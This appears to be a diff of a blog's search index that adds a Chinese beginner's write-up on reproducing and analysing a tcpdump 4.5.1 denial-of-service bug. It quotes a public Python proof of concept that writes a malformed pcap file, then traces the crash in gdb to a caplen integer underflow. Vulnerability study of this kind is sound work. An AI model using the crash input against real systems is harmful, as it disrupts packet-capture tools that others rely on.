+<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528091015995.png" alt="image-20210528091015995"></p>
+<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528100934762.png" alt="image-20210528100934762" style="zoom: 50%;"><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528100950328.png" alt="image-20210528100950328" style="zoom: 33%;"></p>
+<p>2、换了个更好的公司</p>
+<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210610145500746.png" alt="image-20210610145500746"></p>
+]]></content>
   </entry>
   <entry>
     <title>加密与解密笔记--更新中</title>
@@ -2029,17 +2045,181 @@
       </tags>
   </entry>
   <entry>
-    <title>世界线偏移-2021.6.10</title>
-    <url>/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/</url>
-    <content><![CDATA[<p>近期的一些小成果：</p>
+    <title>tcpdump4.5.1拒绝服务漏洞复现分析</title>
+    <url>/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h4 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h4><p>新手开始学习二进制漏洞</p>
+<p>选择这个开始学习，是因为这是一个网上有很多复现和分析文章的漏洞，即常见高频漏洞</p>
+<p>分析文章：</p>
+<blockquote>
+<p><a href="https://www.freebuf.com/vuls/248394.html">https://www.freebuf.com/vuls/248394.html</a></p>
+<p><a href="https://www.anquanke.com/post/id/166711">https://www.anquanke.com/post/id/166711</a></p>
+<p><a href="https://bbs.pediy.com/thread-261984.htm">https://bbs.pediy.com/thread-261984.htm</a></p>
+</blockquote>
 <a id="more"></a>
 
-<p>1、成长平台百分，写了不少脚本和总结</p>
-<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528091015995.png" alt="image-20210528091015995"></p>
-<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528100934762.png" alt="image-20210528100934762" style="zoom: 50%;"><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210528100950328.png" alt="image-20210528100950328" style="zoom: 33%;"></p>
-<p>2、换了个更好的公司</p>
-<p><img src="/2021/06/10/%E4%B8%96%E7%95%8C%E7%BA%BF%E5%81%8F%E7%A7%BB-2021-6-10/image-20210610145500746.png" alt="image-20210610145500746"></p>
+<h5 id="0x01-前置知识："><a href="#0x01-前置知识：" class="headerlink" title="0x01 前置知识："></a>0x01 前置知识：</h5><h6 id="pcap包格式"><a href="#pcap包格式" class="headerlink" title="pcap包格式"></a>pcap包格式</h6><blockquote>
+<p><a href="https://www.winpcap.org/docs/docs_412/html/incs_2pcap_8h_source.html">https://www.winpcap.org/docs/docs_412/html/incs_2pcap_8h_source.html</a></p>
+</blockquote>
+<p>pcap文件主要包含了三个部分，24字节的pcap文件头，16字节的数据包头，数据包内容。</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163152207.png" alt="image-20210714163152207"></p>
+<h4 id="0x1-环境搭建"><a href="#0x1-环境搭建" class="headerlink" title="0x1 环境搭建"></a>0x1 环境搭建</h4><p>系统：kali 2021.2</p>
+<h5 id="0x11-tcpdump安装"><a href="#0x11-tcpdump安装" class="headerlink" title="0x11 tcpdump安装"></a>0x11 tcpdump安装</h5><p>当前版本查看：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154436177.png" alt="image-20210714154436177"></p>
+<p>卸载：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get --purge remove tcpdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154524975.png" alt="image-20210714154524975"></p>
+<h6 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install flex</span><br><span class="line">apt install bison</span><br></pre></td></tr></table></figure>
+
+<h6 id="安装libpcap"><a href="#安装libpcap" class="headerlink" title="安装libpcap"></a><strong>安装libpcap</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;libpcap-1.5.3.tar.gz </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154822298.png" alt="image-20210714154822298"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf libpcap-1.5.3.tar.gz</span><br><span class="line">cd libpcap-1.5.3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714154955786.png" alt="image-20210714154955786"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155033795.png" alt="image-20210714155033795"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155127829.png" alt="image-20210714155127829"></p>
+<h6 id="安装tcpdump"><a href="#安装tcpdump" class="headerlink" title="安装tcpdump"></a><strong>安装tcpdump</strong></h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;tcpdump-4.5.1.tar.gz</span><br><span class="line">tar -zxvf tcpdump-4.5.1.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155342417.png" alt="image-20210714155342417"></p>
+<p>接下来同上：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd tcpdump-4.5.1</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>装完之后查看版本：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714155539098.png" alt="image-20210714155539098"></p>
+<h5 id="0x12-poc"><a href="#0x12-poc" class="headerlink" title="0x12 poc"></a>0x12 poc</h5><blockquote>
+<p><a href="https://www.exploit-db.com/exploits/39875">https://www.exploit-db.com/exploits/39875</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Exploit Title: tcpdump 4.5.1 Access Violation Crash</span><br><span class="line"># Date: 31st May 2016</span><br><span class="line"># Exploit Author: David Silveiro</span><br><span class="line"># Vendor Homepage: http:&#x2F;&#x2F;www.tcpdump.org</span><br><span class="line"># Software Link: http:&#x2F;&#x2F;www.tcpdump.org&#x2F;release&#x2F;tcpdump-4.5.1.tar.gz</span><br><span class="line"># Version: 4.5.1</span><br><span class="line"># Tested on: Ubuntu 14 LTS</span><br><span class="line"></span><br><span class="line">from subprocess import call</span><br><span class="line">from shlex import split</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def crash():</span><br><span class="line"></span><br><span class="line">    command &#x3D; &#39;tcpdump -r crash&#39;</span><br><span class="line">    buffer     &#x3D;   &#39;\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00&lt;\x9c7@\xff\x00&#39;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a&#39;</span><br><span class="line">    buffer     +&#x3D;  &quot;\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&amp;\x80\x18\&#39;&quot;</span><br><span class="line">    buffer     +&#x3D;  &quot;xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n&#39;, &#39;\x00\x00\x00\x00&quot;</span><br><span class="line">    buffer     +&#x3D;  &#39;\x00\x00\x00\x00\x01\x03\x03\x04&#39;</span><br><span class="line">    with open(&#39;crash&#39;, &#39;w+b&#39;) as file:</span><br><span class="line">        file.write(buffer)</span><br><span class="line">    try:</span><br><span class="line">        call(split(command))</span><br><span class="line">        print(&quot;Exploit successful!             &quot;)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;Error: Something has gone wrong!&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;Author:   David Silveiro                           &quot;)</span><br><span class="line">    print(&quot;   tcpdump version 4.5.1 Access Violation Crash    &quot;)</span><br><span class="line">    sleep(2)</span><br><span class="line">    crash()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过运行这个poc，我们可以获得一个crash文件</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714160246743.png" alt="image-20210714160246743"></p>
+<h5 id="0x13-crash文件"><a href="#0x13-crash文件" class="headerlink" title="0x13 crash文件"></a>0x13 crash文件</h5><p>用winhex看一看这个crash文件</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714161151520.png" alt="image-20210714161151520"></p>
+<p>对应pcap文件</p>
+<h4 id="0x2-漏洞复现"><a href="#0x2-漏洞复现" class="headerlink" title="0x2 漏洞复现"></a>0x2 漏洞复现</h4><h6 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h6><p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163355396.png" alt="image-20210714163355396"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -r crash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163544925.png" alt="image-20210714163544925"></p>
+<p>发生段错误。</p>
+<h6 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h6><p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714164206440.png" alt="image-20210714164206440"></p>
+<h4 id="0x3-漏洞分析"><a href="#0x3-漏洞分析" class="headerlink" title="0x3 漏洞分析"></a>0x3 漏洞分析</h4><h5 id="0x31-跟踪调试"><a href="#0x31-跟踪调试" class="headerlink" title="0x31 跟踪调试"></a>0x31 跟踪调试</h5><h6 id="安装gdb及常用插件peda-pwndbg"><a href="#安装gdb及常用插件peda-pwndbg" class="headerlink" title="安装gdb及常用插件peda/pwndbg"></a>安装gdb及常用插件peda/pwndbg</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install gdb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163905628.png" alt="image-20210714163905628"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda</span><br><span class="line">echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot;&gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165900100.png" alt="image-20210714165900100"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165918843.png" alt="image-20210714165918843"></p>
+<h6 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h6><p><strong>用gdb打开</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb tcpdump</span><br><span class="line">gdb-peda$run -r crash文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170212005.png" alt="image-20210714170212005"></p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170252515.png" alt="image-20210714170252515"></p>
+<p>运行后可以看到寄存器信息等：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170640606.png" alt="image-20210714170640606"></p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170801622.png" alt="image-20210714170801622"></p>
+<p>可以得知发生错误的原因：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: Cannot access memory at address 0x5555557f7000</span><br><span class="line">#无法访问地址 0x5555557f7000 处的内存</span><br></pre></td></tr></table></figure>
+
+<p>即访问了不可访问的地址而导致的程序崩溃</p>
+<p>位置在print_ascii.c文件中的91行</p>
+<p><strong>使用bt语句查看函数调用栈：</strong></p>
+<p>bt:显示所有的函数调用栈帧的信息，每个帧一行。</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714171537759.png" alt="image-20210714171537759"></p>
+<p>可以看到函数调用以及所在的文件情况：</p>
+<table>
+<thead>
+<tr>
+<th>文件位置</th>
+<th>函数名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>libc-start.c:308</td>
+<td>__libc_start_main</td>
+</tr>
+<tr>
+<td>tcpdump.c:1569</td>
+<td>main</td>
+</tr>
+<tr>
+<td>pcap.c:849</td>
+<td>pcap_loop</td>
+</tr>
+<tr>
+<td>savefile.c:409</td>
+<td>pcap_offline_read</td>
+</tr>
+<tr>
+<td>tcpdump.c:1950</td>
+<td>print_packet</td>
+</tr>
+<tr>
+<td>print-802_15_4.c:180</td>
+<td>ieee802_15_4_if_print</td>
+</tr>
+<tr>
+<td>print-ascii.c:91</td>
+<td>hex_and_ascii_print_with_offset</td>
+</tr>
+</tbody></table>
+<p>接下来去tcpdump和libpcap的文件夹中取得上述文件，查看源码：</p>
+<p>tcpdump.c:1569：调用了pcap_loop</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181754004.png" alt="image-20210714181754004"></p>
+<p>pcap.c:849：pcap_loop函数，调用了pcap_offline_read</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181831537.png" alt="image-20210714181831537"></p>
+<p>savefile.c:409:pcap_offline_read函数：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714182139084.png" alt="image-20210714182139084"></p>
+<p>这里面有一个callback，根据函数调用栈可以知道是调用了print_packet</p>
+<p>tcpdump中的print_packet函数中，这里调用了ieee802_15_4_if_print</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170515455.png" alt="image-20210715170515455"></p>
+<p>在print-802_15_4的ieee802_15_4_if_print函数中，调用了ndo_default_print：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170602361.png" alt="image-20210715170602361"></p>
+<p>通过搜索这个函数，我们可以看到里面调用了hex_and_ascii_print：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171350065.png" alt="image-20210715171350065"></p>
+<p>hex_and_ascii_print直接调用了hex_and_ascii_print_with_offset：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171624113.png" alt="image-20210715171624113"></p>
+<p>函数在print-ascii中：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170659670.png" alt="image-20210715170659670"></p>
+<p>根据while，知道这是一个循环，就可以猜测原因大概是因为循环，s2越界访问了</p>
+<p>可以看出循环与nshorts有关，根据86行代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nshorts &#x3D; length &#x2F; sizeof(u_short);</span><br></pre></td></tr></table></figure>
+
+<p>得知与length有关</p>
+<p>一路向上寻找传入的length参数，根据以下调用：length就是caplen</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(ndo-&gt;ndo_default_print)(ndo, p, caplen);</span><br></pre></td></tr></table></figure>
+
+<p>结合gdb单步调试和源码分析ieee802_15_4_if_print函数：</p>
+<p>给ieee802_15_4_if_print函数下断点：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b ieee802_15_4_if_print</span><br><span class="line">run -r crash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715180222023.png" alt="image-20210715180222023"></p>
+<p>然后s进入，可以继续单步n调试</p>
+<p>查看变量此时的值：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715181224711.png" alt="image-20210715181224711"></p>
+<p>ieee802_15_4_if_print函数：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ieee802_15_4_if_print(struct netdissect_options *ndo,</span><br><span class="line">                      const struct pcap_pkthdr *h, const u_char *p)</span><br><span class="line">&#123;</span><br><span class="line">	u_int caplen &#x3D; h-&gt;caplen;</span><br><span class="line">	int hdrlen;</span><br><span class="line">	u_int16_t fc;</span><br><span class="line">	u_int8_t seq;</span><br><span class="line"></span><br><span class="line">	if (caplen &lt; 3) &#123;&#x2F;&#x2F;n步第一次，caplen &#x3D; 0x8</span><br><span class="line">		ND_PRINT((ndo, &quot;[|802.15.4] %x&quot;, caplen));</span><br><span class="line">		return caplen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fc &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">	hdrlen &#x3D; extract_header_length(fc);&#x2F;&#x2F;n步第二次，fc &#x3D; 0xff40</span><br><span class="line"></span><br><span class="line">	seq &#x3D; EXTRACT_LE_8BITS(p + 2);</span><br><span class="line"></span><br><span class="line">	p +&#x3D; 3;&#x2F;&#x2F;n步第三次，hdrlen &#x3D; 0x12</span><br><span class="line">	caplen -&#x3D; 3;&#x2F;&#x2F;n步第三次</span><br><span class="line"></span><br><span class="line">	ND_PRINT((ndo,&quot;IEEE 802.15.4 %s packet &quot;, ftypes[fc &amp; 0x7]));&#x2F;&#x2F;n步第四次，caplen &#x3D; 0x5</span><br><span class="line">	if (vflag)&#x2F;&#x2F;n步第五次</span><br><span class="line">		ND_PRINT((ndo,&quot;seq %02x &quot;, seq));</span><br><span class="line">	if (hdrlen &#x3D;&#x3D; -1) &#123;</span><br><span class="line">		ND_PRINT((ndo,&quot;malformed! &quot;));</span><br><span class="line">		return caplen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if (!vflag) &#123;</span><br><span class="line">		p+&#x3D; hdrlen;&#x2F;&#x2F;n步第六次</span><br><span class="line">		caplen -&#x3D; hdrlen;&#x2F;&#x2F;n步第七次，caplen和hdrlen做了运算</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		u_int16_t panid &#x3D; 0;</span><br><span class="line"></span><br><span class="line">		switch ((fc &gt;&gt; 10) &amp; 0x3) &#123;</span><br><span class="line">		case 0x00:</span><br><span class="line">			ND_PRINT((ndo,&quot;none &quot;));</span><br><span class="line">			break;</span><br><span class="line">		case 0x01:</span><br><span class="line">			ND_PRINT((ndo,&quot;reserved destination addressing mode&quot;));</span><br><span class="line">			return 0;</span><br><span class="line">		case 0x02:</span><br><span class="line">			panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			break;</span><br><span class="line">		case 0x03:</span><br><span class="line">			panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p)));</span><br><span class="line">			p +&#x3D; 8;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">		ND_PRINT((ndo,&quot;&lt; &quot;);</span><br><span class="line"></span><br><span class="line">		switch ((fc &gt;&gt; 14) &amp; 0x3) &#123;</span><br><span class="line">		case 0x00:</span><br><span class="line">			ND_PRINT((ndo,&quot;none &quot;));</span><br><span class="line">			break;</span><br><span class="line">		case 0x01:</span><br><span class="line">			ND_PRINT((ndo,&quot;reserved source addressing mode&quot;));</span><br><span class="line">			return 0;</span><br><span class="line">		case 0x02:</span><br><span class="line">			if (!(fc &amp; (1 &lt;&lt; 6))) &#123;</span><br><span class="line">				panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">				p +&#x3D; 2;</span><br><span class="line">			&#125;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			break;</span><br><span class="line">		case 0x03:</span><br><span class="line">			if (!(fc &amp; (1 &lt;&lt; 6))) &#123;</span><br><span class="line">				panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">				p +&#x3D; 2;</span><br><span class="line">			&#125;</span><br><span class="line">                        ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p))));</span><br><span class="line">			p +&#x3D; 8;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		caplen -&#x3D; hdrlen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (!suppress_default_print)&#x2F;&#x2F;n步第八次，此时caplen&#x3D;0xfffffff3</span><br><span class="line">		(ndo-&gt;ndo_default_print)(ndo, p, caplen);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>而0xfffffff3=-13</p>
+<p>作为length传入之后，可以得到nshorts为‭7FFFFFF9‬（0xfffffff3/2）</p>
+<p>变成了一个极大的值，而数据包并没有这么大，因此最终访问到未授权的内存地址。</p>
+<p>所以这个漏洞就是因为tcpdump会根据caplen长度去读取保存在内存空间数据包的内容，当引用到不可读取内存位置时，造成拒绝服务漏洞。</p>
+<h5 id="0x32-poc"><a href="#0x32-poc" class="headerlink" title="0x32 poc"></a>0x32 poc</h5><p>caplen是由于做了caplen -= hdrlen;操作变成了负数，才导致了后续nshorts变成极大的值</p>
+<p>因此只要我们的caplen-hdrlen是负数就可以了，这样的包就会引发漏洞</p>
 ]]></content>
+      <categories>
+        <category>二进制漏洞</category>
+      </categories>
+      <tags>
+        <tag>tcpdump</tag>
+        <tag>gdb</tag>
+      </tags>
   </entry>
   <entry>
     <title>恶意代码分析实战笔记--更新中</title>
